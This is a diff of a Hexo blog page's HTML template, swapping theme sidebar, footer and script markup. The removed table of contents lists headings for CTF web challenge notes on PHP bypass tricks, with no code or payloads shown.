class="toc-text">Web-97 md5强比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-98-%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97"><span class="toc-text">Web-98 三元运算</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-99-in-array%E7%BB%95%E8%BF%87"><span class="toc-text">Web-99 in_array绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array"><span class="toc-text">in_array</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-100-%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8F%8A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">Web-100 反射类及运算符优先级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-101-%E5%8F%8D%E5%B0%84%E7%B1%BB"><span class="toc-text">Web-101 反射类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-102-103-hex2bin"><span class="toc-text">Web-102,103 hex2bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hex2bin"><span class="toc-text">hex2bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric"><span class="toc-text">is_numeric</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents"><span class="toc-text">file_put_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-text">构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-104-sha1%E5%BC%B1%E7%AD%89%E4%BA%8E"><span class="toc-text">Web-104 sha1弱等于</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-105-%E8%A6%86%E7%9B%96"><span class="toc-text">Web-105 $$覆盖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-106-sha1%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-106 sha1弱比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-107-md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-107 md5弱比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#parse-str%E5%87%BD%E6%95%B0"><span class="toc-text">parse_str函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-108-ereg-00%E6%88%AA%E6%96%AD"><span class="toc-text">Web-108 ereg %00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ereg"><span class="toc-text">ereg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strrev"><span class="toc-text">strrev</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval"><span class="toc-text">intval</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-109-%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%8C%E5%BC%82%E5%B8%B8%E7%B1%BB"><span class="toc-text">Web-109 反射类，异常类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-110-FilesystemIterator%E7%B1%BB"><span class="toc-text">Web-110 FilesystemIterator类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-111-GLOBALS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">Web-111 GLOBALS全局变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-112-is-file%E7%BB%95%E8%BF%87-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">Web-112 is_file绕过,php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#is-file"><span class="toc-text">is_file()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%EF%BC%9A"><span class="toc-text">实验：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-113-%E7%9B%AE%E5%BD%95%E6%BA%A2%E5%87%BA"><span class="toc-text">Web-113 目录溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-114-filter"><span class="toc-text">Web-114 filter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-115-trim%E7%BB%95%E8%BF%87"><span class="toc-text">Web-115 trim绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#trim"><span class="toc-text">trim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol>
-      </div>
-    </article>
-  
-  
-  <article class="card card-content categories-widget">
-    <div class="categories-card">
-  <div class="categories-header">
-    <i 
-      class="iconfont icon-fenlei" 
-      style="padding-right: 2px;">
-    </i>Categories
-  </div>
-  <div class="categories-list">
-    
-      <a href="/categories/Linux/">
-        <div class="categories-list-item">
-          Linux
-          <span class="categories-list-item-badge">2</span>
-        </div>
-      </a>
-    
-      <a href="/categories/WebSec/">
-        <div class="categories-list-item">
-          WebSec
-          <span class="categories-list-item-badge">5</span>
-        </div>
-      </a>
-    
-      <a href="/categories/SystemSec/">
-        <div class="categories-list-item">
-          SystemSec
-          <span class="categories-list-item-badge">1</span>
-        </div>
-      </a>
-    
-      <a href="/categories/Exploit/">
-        <div class="categories-list-item">
-          Exploit
-          <span class="categories-list-item-badge">1</span>
-        </div>
-      </a>
-    
-  </div>
-</div>
-  </article>
-  
-  <article class="card card-content tags-widget">
-    <div class="tags-card">
-  <div class="tags-header">
-    <i 
-      class="iconfont icon-biaoqian" 
-      style="padding-right: 2px;">
-    </i>hot tags
-  </div>
-  <div class="tags-list">
-    
-      <a 
-        href="/tags/Security/" 
-        title="Security">
-        <div class="tags-list-item">Security</div>
-      </a>
-    
-      <a 
-        href="/tags/Web/" 
-        title="Web">
-        <div class="tags-list-item">Web</div>
-      </a>
-    
-      <a 
-        href="/tags/Linux/" 
-        title="Linux">
-        <div class="tags-list-item">Linux</div>
-      </a>
-    
-      <a 
-        href="/tags/PHP/" 
-        title="PHP">
-        <div class="tags-list-item">PHP</div>
-      </a>
-    
-      <a 
-        href="/tags/Penetration-Testing/" 
-        title="Penetration Testing">
-        <div class="tags-list-item">Penetration Testing</div>
-      </a>
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
-            <aside class="right-column">
-              <div class="sticky-widescreen">
-  
-  
-    <article class="card card-content toc-card">
-      <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-89-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-text">Web-89 数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-90-intval"><span class="toc-text">Web-90 intval</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-text">intval函数说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-91-0a%E7%BB%95%E8%BF%87"><span class="toc-text">Web-91 %0a绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-92-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-92 intval 八进制十六进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-93-intval-%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">Web-93 intval 八进制绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-94-intval-%E5%B0%8F%E6%95%B0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">Web-94 intval 小数点绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-95-intval-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">Web-95 intval 空格绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-96-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">Web-96 绝对路径，相对路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-97-md5%E5%BC%BA%E6%AF%94%E8%BE%83"><span class="toc-text">Web-97 md5强比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-98-%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97"><span class="toc-text">Web-98 三元运算</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-99-in-array%E7%BB%95%E8%BF%87"><span class="toc-text">Web-99 in_array绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array"><span class="toc-text">in_array</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-100-%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8F%8A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">Web-100 反射类及运算符优先级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-101-%E5%8F%8D%E5%B0%84%E7%B1%BB"><span class="toc-text">Web-101 反射类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-102-103-hex2bin"><span class="toc-text">Web-102,103 hex2bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hex2bin"><span class="toc-text">hex2bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric"><span class="toc-text">is_numeric</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents"><span class="toc-text">file_put_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-text">构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-104-sha1%E5%BC%B1%E7%AD%89%E4%BA%8E"><span class="toc-text">Web-104 sha1弱等于</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-105-%E8%A6%86%E7%9B%96"><span class="toc-text">Web-105 $$覆盖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-106-sha1%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-106 sha1弱比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-107-md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">Web-107 md5弱比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#parse-str%E5%87%BD%E6%95%B0"><span class="toc-text">parse_str函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-108-ereg-00%E6%88%AA%E6%96%AD"><span class="toc-text">Web-108 ereg %00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ereg"><span class="toc-text">ereg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strrev"><span class="toc-text">strrev</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval"><span class="toc-text">intval</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-109-%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%8C%E5%BC%82%E5%B8%B8%E7%B1%BB"><span class="toc-text">Web-109 反射类，异常类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-110-FilesystemIterator%E7%B1%BB"><span class="toc-text">Web-110 FilesystemIterator类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-111-GLOBALS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">Web-111 GLOBALS全局变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-112-is-file%E7%BB%95%E8%BF%87-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">Web-112 is_file绕过,php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#is-file"><span class="toc-text">is_file()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%EF%BC%9A"><span class="toc-text">实验：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-113-%E7%9B%AE%E5%BD%95%E6%BA%A2%E5%87%BA"><span class="toc-text">Web-113 目录溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-114-filter"><span class="toc-text">Web-114 filter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-115-trim%E7%BB%95%E8%BF%87"><span class="toc-text">Web-115 trim绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#trim"><span class="toc-text">trim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol>
-    </article>
-  
-  
-  <article class="card card-content">
-    <div class="recent-posts-card">
-  <div class="recent-posts-header">
-    <i 
-      class="iconfont icon-wenzhang_huaban" 
-      style="padding-right: 2px;">
-    </i>Recent Posts
-  </div>
-  <div class="recent-posts-list">
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-09</div>
-        <a href="/2021/12/09/Directory-Traversal/"><div class="recent-posts-item-content">Directory Traversal</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-02</div>
-        <a href="/2021/12/02/PHP-Security-Features/"><div class="recent-posts-item-content">PHP Security Features</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-11-04</div>
-        <a href="/2021/11/04/Linux-Security/"><div class="recent-posts-item-content">Linux-Security</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-11-04</div>
-        <a href="/2021/11/04/N1BOOK-XSS/"><div class="recent-posts-item-content">N1BOOK-XSS</div></a>
-      </div>
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
-          </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/09/Directory-Traversal/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Directory Traversal</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/04/Linux-Security/">
+                        <span class="hidden-mobile">Linux-Security</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
     </div>
-     
-    <footer class="footer">
-  <div class="footer-container">
-    <div>
-      <div class="footer-dsc">
-        <span>
-          Copyright ©
-          
-            2020 -
-          
-          2021
-        </span>
-        &nbsp;
-        <a 
-          href="/" 
-          class="footer-link">
-          0x95cn
-        </a>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
+  </div>
+</div>
+    
 
     
-      <div class="footer-dsc">
-        
-          Powered by
-          <a 
-            href="https://hexo.io/" 
-            class="footer-link" 
-            target="_blank" 
-            rel="nofollow noopener noreferrer">
-            &nbsp;Hexo
-          </a>
-        
-        
-          <span>&nbsp;|&nbsp;</span>
-        
-        
-          Theme -
-          <a 
-            href="https://github.com/theme-kaze" 
-            class="footer-link" 
-            target="_blank"
-            rel="nofollow noopener noreferrer">
-            &nbsp;Kaze
-          </a>
-        
-      </div>
-    
-    
-    
-    
-</footer> 
-    
-  <a 
-    role="button" 
-    id="scrollbutton" 
-    class="basebutton" 
-    aria-label="回到顶部">
-    <i class="iconfont icon-arrowleft button-icon"></i>
-  </a>
+  </main>
 
-<a 
-  role="button" 
-  id="menubutton"
-  aria-label="menu button"
-  class="basebutton">
-  <i class="iconfont icon-menu button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="popbutton" 
-  class="basebutton" 
-  aria-label="控制中心">
-  <i class="iconfont icon-expand button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="darkbutton" 
-  class="basebutton darkwidget" 
-  aria-label="夜色模式">
-  <i class="iconfont icon-weather button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="searchbutton" 
-  class="basebutton searchwidget" 
-  aria-label="搜索">
-  <i class="iconfont icon-search button-icon"></i>
-</a> 
-     
-     
-     
-      <script>
-  var addImgLayout = function () {
-    var img = document.querySelectorAll('.post-content img')
-    var i
-    for (i = 0; i < img.length; i++) {
-      var wrapper = document.createElement('a')
-      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
-      wrapper.setAttribute('aria-label', 'illustration')
-      wrapper.style.cssText =
-        'width: 100%; display: flex; justify-content: center;'
-      if (img[i].alt) wrapper.dataset.caption = img[i].alt
-      wrapper.dataset.nolink = true
-      img[i].before(wrapper)
-      wrapper.append(img[i])
-      var divWrap = document.createElement('div')
-      divWrap.classList.add('gallery')
-      wrapper.before(divWrap)
-      divWrap.append(wrapper)
-    }
-    baguetteBox.run('.gallery')
-  }
-</script>
-<script>
-  loadScript(
-    "/js/lib/lightbox/baguetteBox.min.js",
-    addImgLayout
-  )
-</script>
- 
-     
-     
-    <script src="/js/main.js"></script> 
-     
-    
-      <script>
-        var addLazyload = function () {
-          var observer = lozad('.lozad', {
-            load: function (el) {
-              el.srcset = el.getAttribute('data-src')
-            },
-            loaded: function (el) {
-              el.classList.add('loaded')
-            },
-          })
-          observer.observe()
-        }
-      </script>
-      <script>
-        loadScript('/js/lib/lozad.min.js', addLazyload)
-      </script>
-     
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
     
     
-  </body>
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
 </html>
